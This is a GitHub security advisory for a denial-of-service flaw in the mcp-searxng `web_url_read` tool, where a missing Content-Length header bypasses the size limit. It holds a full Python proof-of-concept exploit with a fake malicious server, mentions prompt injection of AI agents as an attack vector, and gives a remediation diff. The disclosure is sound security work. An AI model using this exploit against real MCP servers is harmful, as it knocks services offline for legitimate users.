# [H]  SearXNG MCP Server: Unbounded Response Body Read Bypasses URL Size Limit in `web_url_read`

## Summary
Severity: High
Advisory: GHSA-xcqx-9jf5-w339
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-xcqx-9jf5-w339
Type: github-advisory

## Affected
- npm: `mcp-searxng` — affected >=0 <1.7.1

## Details
## Unbounded Response Body Read Bypasses URL Size Limit in `web_url_read`

### Summary

The `web_url_read` MCP tool in mcp-searxng enforces its 5 MiB response-size limit exclusively by inspecting the `Content-Length` header of a preliminary HEAD request. When a server omits `Content-Length` — a standard HTTP practice — `checkContentLength()` returns `null`, the guard condition short-circuits to `false`, and `response.text()` loads the entire response body into memory without any byte cap. An unauthenticated attacker who controls or can redirect to an HTTP endpoint can force the server process to consume unbounded memory and CPU, leading to a Denial of Service.

### Details

`web_url_read` is the entry point (`src/index.ts:226-240`). It passes the caller-supplied URL directly into `readUrlContent()` in `src/url-reader.ts`.

**Size-limit check (bypassed)**

```ts
// src/url-reader.ts:352-360
const contentLength = await checkContentLength(...);
if (contentLength !== null && contentLength > maxContentLengthBytes) {
  return createContentTooLargeMessage(contentLength, maxContentLengthBytes);
}
```

`checkContentLength()` (`src/url-reader.ts:243-245`) returns `null` when the HEAD response carries no `Content-Length` header. Because the guard uses the `!== null` conjunction, a `null` result causes the entire check to evaluate as `false`, and execution falls through without enforcing the configured 5 MiB ceiling.

**Unbounded sinks**

A full GET request is then issued (`src/url-reader.ts:367`) with no streaming byte cap:

```ts
// src/url-reader.ts:414  — normal response path
htmlContent = await response.text();

// src/url-reader.ts:402  — error response path (same issue)
responseBody = await response.text();
```

The full HTML string is subsequently passed to `NodeHtmlMarkdown.translate()` (`src/url-reader.ts:429`), which amplifies CPU consumption proportional to the body size.

**Default exposure**

`web_url_read` is enabled by default. In HTTP transport mode, authentication is disabled by default, so `AV:N/PR:N` applies unconditionally. In stdio mode, an attacker can trigger the path via prompt injection to cause the AI model to call the tool with an attacker-controlled URL.

### PoC

**Prerequisites**

- Docker installed.
- Build context: the repository root (`npmAI_249_ihor-sokoliuk__mcp-searxng/`).

**Build the image**

```bash
docker build \
  -t vuln002-test \
  -f vuln-002/Dockerfile \
  reports/npmAI_249_ihor-sokoliuk__mcp-searxng/
```

**Run the PoC**

```bash
docker run --rm vuln002-test
```

The container starts two processes:
1. A malicious HTTP server on `127.0.0.1:9799` that responds to HEAD with HTTP 200 and **no `Content-Length`**, then responds to GET with a 6,291,456-byte HTML body and **no `Content-Length`**.
2. mcp-searxng in HTTP mode (`MCP_HTTP_ALLOW_PRIVATE_URLS=true` enables loopback URLs for local reproduction).

The PoC script initializes an MCP session and calls:

```json
{
  "method": "tools/call",
  "params": {
    "name": "web_url_read",
    "arguments": { "url": "http://127.0.0.1:9799/", "maxLength": 1 }
  }
}
```

**Observed output (Phase 2 confirmation)**

```
HEAD_REQUESTS              : 1
GET_REQUESTS               : 1
GET_BYTES_SENT             : 6,291,456
CONFIGURED_DEFAULT_LIMIT   : 5,242,880
BYTES_OVER_LIMIT           : +1,048,576
ELAPSED_SEC                : 0.17
TOOL_STATUS                : SUCCESS
RETURNED_LENGTH_CHARS      : 1

[PASS] VULNERABILITY CONFIRMED
  6,291,456 bytes were transmitted to mcp-searxng despite a 5,242,880-byte (5 MiB) limit.
  Root cause confirmed:
    1. HEAD response had no Content-Length header.
    2. checkContentLength() returned null  (url-reader.ts:243-245)
    3. Guard condition was false (null !== null => false) (url-reader.ts:359)
    4. response.text() read 6,291,456 bytes without a cap (url-reader.ts:414)
```

**Remediation**

Replace both `response.text()` calls with a streaming reader that aborts once the byte counter exceeds `maxContentLengthBytes`:

```diff
+async function readResponseTextWithLimit(response: Response, maxBytes: number): Promise<string | null> {
+  if (!response.body) return response.text();
+  const reader = response.body.getReader();
+  const decoder = new TextDecoder();
+  const chunks: string[] = [];
+  let total = 0;
+  while (true) {
+    const { done, value } = await reader.read();
+    if (done) break;
+    total += value.byteLength;
+    if (total > maxBytes) { await reader.cancel(); return null; }
+    chunks.push(decoder.decode(value, { stream: true }));
+  }
+  chunks.push(decoder.decode());
+  return chunks.join("");
+}

-        responseBody = await response.text();
+        responseBody = await readResponseTextWithLimit(response, maxContentLengthBytes)
+          ?? "[Response body exceeded configured size limit]";

-      htmlContent = await response.text();
+      const limitedBody = await readResponseTextWithLimit(response, maxContentLengthBytes);
+      if (limitedBody === null) {
+        return createContentTooLargeMessage(maxContentLengthBytes + 1, maxContentLengthBytes);
+      }
+      htmlContent = limitedBody;
```

### Impact

This is an **Uncontrolled Resource Consumption (DoS)** vulnerability. Any network-reachable attacker who can supply a URL to the `web_url_read` tool can force the mcp-searxng process to allocate memory proportional to an arbitrarily large HTTP response body and burn CPU during HTML-to-Markdown conversion. The attack requires no authentication in the default HTTP transport configuration. In stdio mode, the attack surface is accessible through prompt injection targeting the AI agent. Repeated or concurrent invocations can exhaust process memory and render the MCP server unavailable to all legitimate users.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM node:20-slim

# Install Python3 for the PoC script
RUN apt-get update && apt-get install -y --no-install-recommends python3 \
    && rm -rf /var/lib/apt/lists/*

# Copy repository source and build the vulnerable mcp-searxng
# Build context: parent directory (npmAI_249_ihor-sokoliuk__mcp-searxng/)
WORKDIR /app
COPY repo/ /app/
RUN npm ci && npm run build

# Copy the PoC script
COPY vuln-002/poc.py /poc.py

# Run the dynamic reproduction PoC
CMD ["python3", "-u", "/poc.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-002: Unbounded Response Body Read Bypasses URL Size Limit (CWE-400)

Affected: ihor-sokoliuk/mcp-searxng v1.6.0
File:     src/url-reader.ts:414 (response.text())
CWE:      CWE-400 Uncontrolled Resource Consumption
CVSS:     7.5 High (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

Root cause:
  checkContentLength() at src/url-reader.ts:243-245 returns null when the
  server sends no Content-Length header.  The guard at line 359:
      if (contentLength !== null && contentLength > maxContentLengthBytes)
  evaluates to false (null !== null => false), so the check is skipped.
  response.text() at line 414 then reads the full body without any byte cap.

Reproduction:
  1. Malicious HTTP server (this process, port 9799):
       HEAD => 200, Content-Type only, NO Content-Length
       GET  => 200, 6+ MiB HTML body, NO Content-Length
  2. mcp-searxng (subprocess, HTTP mode, port 3000):
       MCP_HTTP_ALLOW_PRIVATE_URLS=true  -- allows 127.x for local PoC
  3. This script initializes an MCP session, calls web_url_read pointing
     at the malicious server, and measures actual bytes transmitted.

Expected evidence:
  GET_BYTES_SENT > CONFIGURED_DEFAULT_LIMIT (5242880)
  => The 5 MiB guard was bypassed; full body was consumed without a cap.
"""

import json
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
DEFAULT_MAX_CONTENT_LENGTH = 5 * 1024 * 1024  # 5 MiB (same as src/url-reader.ts)
BODY_SIZE_BYTES = 6 * 1024 * 1024             # 6 MiB — exceeds the configured limit
EVIL_PORT = 9799
MCP_PORT  = 3000

# ---------------------------------------------------------------------------
# Shared state — updated by the malicious server thread
# ---------------------------------------------------------------------------
g_bytes_sent = 0
g_head_count = 0
g_get_count  = 0

# ---------------------------------------------------------------------------
# Malicious HTTP server
# ---------------------------------------------------------------------------
class MaliciousHandler(BaseHTTPRequestHandler):
    """
    Simulates an attacker-controlled HTTP server that:
      - Returns 200 for HEAD with NO Content-Length (triggers null in checkContentLength)
      - Returns 200 for GET with a 6 MiB body and NO Content-Length
        (triggers unbounded response.text() read)
    """

    # Use HTTP/1.0 so the connection closes after the body — no Content-Length needed.
    protocol_version = "HTTP/1.0"

    def log_message(self, fmt, *args):  # suppress default per-request logging
        pass

    def do_HEAD(self):
        global g_head_count
        g_head_count += 1
        print(
            f"[EVIL-SERVER] HEAD #{g_head_count} from {self.address_string()}"
            " — responding 200 with NO Content-Length (triggers null in checkContentLength)",
            flush=True,
        )
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        # Deliberately omitting Content-Length — this is the bypass trigger
        self.end_headers()

    def do_GET(self):
        global g_get_count, g_bytes_sent
        g_get_count += 1
        print(
            f"[EVIL-SERVER] GET #{g_get_count} from {self.address_string()}"
            f" — streaming {BODY_SIZE_BYTES:,} bytes with NO Content-Length",
            flush=True,
        )
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        # Deliberately NO Content-Length header
        self.end_headers()

        # Build a simple but large HTML body that exceeds DEFAULT_MAX_CONTENT_LENGTH.
        # Simple structure keeps NodeHtmlMarkdown conversion fast.
        header = b"<html><body><pre>"
        footer = b"</pre></body></html>"
        payload_char = b"A"
        target = BODY_SIZE_BYTES - len(header) - len(footer)
        chunk_size = 65536  # 64 KiB chunks
        total = 0
        try:
            self.wfile.write(header)
            total += len(header)
            while total < BODY_SIZE_BYTES - len(footer):
                chunk = payload_char * min(chunk_size, BODY_SIZE_BYTES - len(footer) - total)
                self.wfile.write(chunk)
                total += len(chunk)
            self.wfile.write(footer)
            total += len(footer)
        except (BrokenPipeError, OSError):
            pass  # client may close early on abort
        g_bytes_sent = total
        print(f"[EVIL-SERVER] Done. Total bytes sent: {g_bytes_sent:,}", flush=True)


def run_evil_server():
    srv = HTTPServer(("127.0.0.1", EVIL_PORT), MaliciousHandler)
    srv.serve_forever()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def wait_for_port(host: str, port: int, timeout: float = 30) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1):
                return True
        except (ConnectionRefusedError, OSError):
            time.sleep(0.3)
    return False


def http_post(url: str, payload: dict, session_id: str | None = None, timeout: float = 120) -> tuple[bytes, str, str | None]:
    """POST a JSON-RPC payload to the MCP HTTP endpoint. Returns (body, content_type, session_id)."""
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
    }
    if session_id:
        headers["mcp-session-id"] = session_id

    data = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        body = resp.read()
        ct   = resp.headers.get("content-type", "")
        sid  = resp.headers.get("mcp-session-id")
        return body, ct, sid


def parse_mcp_response(body: bytes, content_type: str) -> dict | None:
    """Parse a JSON or SSE-wrapped JSON-RPC response."""
    if "text/event-stream" in content_type:
        for line in body.decode(errors="replace").splitlines():
            if line.startswith("data: "):
                try:
                    return json.loads(line[6:])
                except json.JSONDecodeError:
                    continue
        return None
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        # Fallback: try SSE even if content-type says JSON
        for line in body.decode(errors="replace").splitlines():
            if line.startswith("data: "):
                try:
                    return json.loads(line[6:])
                except json.JSONDecodeError:
                    continue
        return None


# ---------------------------------------------------------------------------
# Main PoC
# ---------------------------------------------------------------------------
def main():
    print("=" * 72, flush=True)
    print("VULN-002 PoC — Unbounded Response Body Read Bypasses URL Size Limit", flush=True)
    print("=" * 72, flush=True)
    print(f"  DEFAULT_MAX_CONTENT_LENGTH_BYTES : {DEFAULT_MAX_CONTENT_LENGTH:,}", flush=True)
    print(f"  EVIL_BODY_SIZE_BYTES             : {BODY_SIZE_BYTES:,}", flush=True)
    print(f"  BYTES_OVER_LIMIT                 : +{BODY_SIZE_BYTES - DEFAULT_MAX_CONTENT_LENGTH:,}", flush=True)
    print(flush=True)

    # ------------------------------------------------------------------
    # Step 1: Start the malicious HTTP server
    # ------------------------------------------------------------------
    print(f"[*] Starting malicious HTTP server on 127.0.0.1:{EVIL_PORT} ...", flush=True)
    evil_thread = threading.Thread(target=run_evil_server, daemon=True)
    evil_thread.start()
    if not wait_for_port("127.0.0.1", EVIL_PORT, timeout=5):
        print("[ERROR] Malicious server failed to start within 5 s", flush=True)
        sys.exit(1)
    print("[+] Malicious server ready", flush=True)

    # ------------------------------------------------------------------
    # Step 2: Start mcp-searxng in HTTP mode
    # ------------------------------------------------------------------
    print(f"[*] Starting mcp-searxng HTTP server on 127.0.0.1:{MCP_PORT} ...", flush=True)
    env = {
        **os.environ,
        "MCP_HTTP_PORT"             : str(MCP_PORT),
        "MCP_HTTP_HOST"             : "127.0.0.1",
        "SEARXNG_URL"               : "http://127.0.0.1:8080",   # not used in this test
        # Allow 127.x URLs so the PoC can point at the local malicious server.
        # (Real attacks target public servers — this env var enables local reproduction.)
        "MCP_HTTP_ALLOW_PRIVATE_URLS": "true",
        "NODE_ENV"                  : "production",
    }
    proc = subprocess.Popen(
        ["node", "/app/dist/cli.js"],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    def stream_server_logs():
        for line in proc.stdout:
            print(f"[MCP-SERVER] {line.decode(errors='replace').rstrip()}", flush=True)

    log_thread = threading.Thread(target=stream_server_logs, daemon=True)
    log_thread.start()

    if not wait_for_port("127.0.0.1", MCP_PORT, timeout=20):
        print("[ERROR] mcp-searxng HTTP server failed to start within 20 s", flush=True)
        proc.terminate()
        sys.exit(1)
    print("[+] mcp-searxng HTTP server ready", flush=True)

    mcp_url = f"http://127.0.0.1:{MCP_PORT}/mcp"

    # ------------------------------------------------------------------
    # Step 3: Initialize MCP session
    # ------------------------------------------------------------------
    print("[*] Initializing MCP session ...", flush=True)
    init_body, init_ct, session_id = http_post(
        mcp_url,
        payload={
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "vuln002-poc", "version": "1.0"},
            },
        },
    )
    init_resp = parse_mcp_response(init_body, init_ct)
    if not init_resp or "result" not in init_resp:
        print(f"[ERROR] initialize failed: {init_body[:400]}", flush=True)
        proc.terminate()
        sys.exit(1)
    print(f"[+] Session initialized. session_id={session_id}", flush=True)

    # Send notifications/initialized (no response expected — ignore errors)
    try:
        http_post(
            mcp_url,
            session_id=session_id,
            payload={"jsonrpc": "2.0", "method": "notifications/initialized"},
            timeout=10,
        )
    except Exception:
        pass  # 202 with empty body or similar non-error responses

    # ------------------------------------------------------------------
    # Step 4: Call web_url_read pointing at the malicious server
    # ------------------------------------------------------------------
    evil_url = f"http://127.0.0.1:{EVIL_PORT}/"
    print(flush=True)
    print(f"[*] Calling web_url_read with URL: {evil_url}", flush=True)
    print(f"    HEAD response will have NO Content-Length", flush=True)
    print(f"    => checkContentLength() returns null", flush=True)
    print(f"    => guard at url-reader.ts:359 is bypassed", flush=True)
    print(f"    => response.text() at url-reader.ts:414 reads ALL {BODY_SIZE_BYTES:,} bytes", flush=True)

    t_start = time.monotonic()
    try:
        tool_body, tool_ct, _ = http_post(
            mcp_url,
            session_id=session_id,
            payload={
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {
                    "name": "web_url_read",
                    "arguments": {"url": evil_url, "maxLength": 1},
                },
            },
            timeout=120,
        )
        elapsed = time.monotonic() - t_start
        tool_resp = parse_mcp_response(tool_body, tool_ct)
    except urllib.error.HTTPError as e:
        elapsed = time.monotonic() - t_start
        tool_resp = parse_mcp_response(e.read(), e.headers.get("content-type", ""))
    except Exception as e:
        elapsed = time.monotonic() - t_start
        print(f"[WARN] tool call exception: {e}", flush=True)
        tool_resp = None

    # Give the evil server thread a moment to flush its final log
    time.sleep(0.5)

    # ------------------------------------------------------------------
    # Step 5: Collect and report evidence
    # ------------------------------------------------------------------
    print(flush=True)
    print("=" * 72, flush=True)
    print("[EVIDENCE]", flush=True)
    print(f"  HEAD_REQUESTS              : {g_head_count}", flush=True)
    print(f"  GET_REQUESTS               : {g_get_count}", flush=True)
    print(f"  GET_BYTES_SENT             : {g_bytes_sent:,}", flush=True)
    print(f"  CONFIGURED_DEFAULT_LIMIT   : {DEFAULT_MAX_CONTENT_LENGTH:,}", flush=True)
    print(
        f"  BYTES_OVER_LIMIT           : {g_bytes_sent - DEFAULT_MAX_CONTENT_LENGTH:+,}",
        flush=True,
    )
    print(f"  ELAPSED_SEC                : {elapsed:.2f}", flush=True)

    if tool_resp:
        if "error" in tool_resp:
            err = tool_resp["error"]
            print(
                f"  TOOL_STATUS                : ERROR code={err.get('code')} "
                f"msg={str(err.get('message', ''))[:120]}",
                flush=True,
            )
        elif "result" in tool_resp:
            content = tool_resp["result"].get("content", [])
            text = content[0].get("text", "") if content else ""
            print(f"  TOOL_STATUS                : SUCCESS", flush=True)
            print(f"  RETURNED_LENGTH_CHARS      : {len(text)}", flush=True)
            print(f"  RETURNED_EXCERPT           : {repr(text[:80])}", flush=True)
    else:
        print(f"  TOOL_STATUS                : (raw) {tool_body[:200] if tool_body else b'<no body>'}", flush=True)

    print("=" * 72, flush=True)

    # ------------------------------------------------------------------
    # Verdict
    # ------------------------------------------------------------------
    bypass_confirmed = g_bytes_sent > DEFAULT_MAX_CONTENT_LENGTH

    if bypass_confirmed:
        print(flush=True)
        print("[PASS] VULNERABILITY CONFIRMED", flush=True)
        print(
            f"  {g_bytes_sent:,} bytes were transmitted to mcp-searxng despite a "
            f"{DEFAULT_MAX_CONTENT_LENGTH:,}-byte ({DEFAULT_MAX_CONTENT_LENGTH // (1024*1024)} MiB) limit.",
            flush=True,
        )
        print(f"  Root cause confirmed:", flush=True)
        print(f"    1. HEAD response had no Content-Length header.", flush=True)
        print(f"    2. checkContentLength() returned null  (url-reader.ts:243-245)", flush=True)
        print(f"    3. Guard condition was false (null !== null => false) (url-reader.ts:359)", flush=True)
        print(f"    4. response.text() read {g_bytes_sent:,} bytes without a cap (url-reader.ts:414)", flush=True)
        proc.terminate()
        sys.exit(0)
    else:
        print(flush=True)
        if g_get_count == 0:
            print("[FAIL] GET request was never received — mcp-searxng did not fetch from the evil server", flush=True)
        else:
            print(
                f"[FAIL] GET request received but bytes_sent={g_bytes_sent:,} <= limit={DEFAULT_MAX_CONTENT_LENGTH:,}",
                flush=True,
            )
        proc.terminate()
        sys.exit(1)


if __name__ == "__main__":
    main()
```

## References
- https://github.com/ihor-sokoliuk/mcp-searxng/security/advisories/GHSA-xcqx-9jf5-w339
- https://github.com/ihor-sokoliuk/mcp-searxng
